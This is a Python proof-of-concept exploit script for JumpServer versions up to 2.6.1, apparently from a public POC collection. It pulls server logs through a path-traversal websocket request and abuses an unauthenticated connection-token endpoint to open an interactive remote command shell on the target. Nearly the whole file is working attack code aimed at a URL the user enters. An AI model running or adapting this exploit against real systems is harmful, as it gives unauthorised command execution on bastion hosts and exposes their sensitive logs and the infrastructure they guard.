import requests
import json
import sys
import time
import asyncio
import websockets
import re
from ws4py.client.threadedclient import WebSocketClient

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                \033[0m')
    print('+  \033[34mPOC_Des: https://www.o2oxy.cn/                                    \033[0m')
    print('+  \033[34mVersion: JumpServer <= v2.6.1                                     \033[0m')
    print('+  \033[36m使用格式: python3 poc.py                                           \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                            \033[0m')
    print('+  \033[36mCmd         >>> whoami				                            \033[0m')
    print('+------------------------------------------')

class ws_long(WebSocketClient):

    def opened(self):
        req = '{"task":"peiqi/../../../../../logs/gunicorn"}'
        self.send(req)

    def closed(self, code, reason=None):
        print("Closed down:", code, reason)

    def received_message(self, resp):
        resp = json.loads(str(resp))
        # print(resp)
        data = resp['message']
        print(data)
        if "/api/v1/perms/asset-permissions/user/validate/?" in data:
            print(data)


async def send_msg(websocket, _text):
    if _text == "exit":
        print(f'you have enter "exit", goodbye')
        await websocket.close(reason="user exit")
        return False
    await websocket.send(_text)
    recv_text = await websocket.recv()
    print(re.findall(r'"data":"(.*?)"', recv_text))


async def main_logic(target_url):
    print("\033[32m[o] 正在连接目标: {}\033[0m".format(target_url))
    async with websockets.connect(target_url) as websocket:
        recv_text = await websocket.recv()
        resws = json.loads(recv_text)
        id = resws['id']
        print("\033[36m[o] 成功获取 ID: {}\033[0m".format(id))

        inittext = json.dumps({"id": id, "type": "TERMINAL_INIT", "data": "{\"cols\":164,\"rows\":17}"})
        await send_msg(websocket, inittext)
        for i in range(7):
            recv_text = await websocket.recv()
            print(re.findall(r'"data":"(.*?)"', recv_text))

        while True:
            cmd = str(input("\033[35mcmd  >>> \033[0m"))
            cmdtext = json.dumps({"id": id, "type": "TERMINAL_DATA", "data": cmd + "\r\n"})
            await send_msg(websocket, cmdtext)
            for i in range(1):
                recv_text = await websocket.recv()
                print(re.findall(r'"data":"(.*?)"', recv_text))


def POC_1(target_url):
    vuln_url = target_url + "/api/v1/users/connection-token/?user-only=1"
    response = requests.get(url=vuln_url, timeout=5)
    print(response.status_code)
    ws_open = str(input("\033[32m[o] 是否想要提取日志（Y/N） >>> \033[0m"))
    try:
        if ws_open == "Y" or ws_open == "y":
                ws = target_url.strip("http://")
                try:
                    ws = ws_long('ws://{}/ws/ops/tasks/log/'.format(ws))
                    ws.connect()
                    ws.run_forever()
                    ws.close()
                except KeyboardInterrupt:
                    ws.close()
        else:
            print("\033[31m[x] 目标漏洞已修复，无法获取敏感日志信息\033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 目标漏洞已修复，无法获取敏感日志信息,{}\033[0m".format(e))
        sys.exit(0)


def POC_2(target_url, user, asset, system_user):
    if target_url == "" or asset == "" or system_user == "":
        print("\033[31m[x] 请获取 assset 等参数配置\033[0m")
        sys.exit(0)
    data = {"user": user, "asset": asset, "system_user": system_user}
    vuln_url = target_url + "/api/v1/users/connection-token/?user-only=1"
    # vuln_url = target_url + "/api/v1/authentication/connection-token/?user-only=1"

    try:
        response = requests.post(vuln_url, json=data, timeout=5).json()
        print("\033[32m[o] 正在请求：{}\033[0m".format(vuln_url))
        token = response['token']
        print("\033[36m[o] 成功获取Token：{}\033[0m".format(token))
        ws_url = target_url.strip("http://")
        ws_url = "ws://" + ws_url + "/koko/ws/token/?target_id={}".format(token)
        asyncio.get_event_loop().run_until_complete(main_logic(ws_url))

    except Exception as e:
        print("\033[31m[x] 请检查 assset 等参数配置,{}\033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    user = "ed3460eb-3c70-4beb-b631-f8f91c39bdd1"
    asset = "37fce0b0-cc4f-4822-8c33-afdebc888fa7"
    system_user = "da09ddd7-fd3f-46c3-914d-752883a4d950"
    POC_1(target_url)
    POC_2(target_url, user, asset, system_user)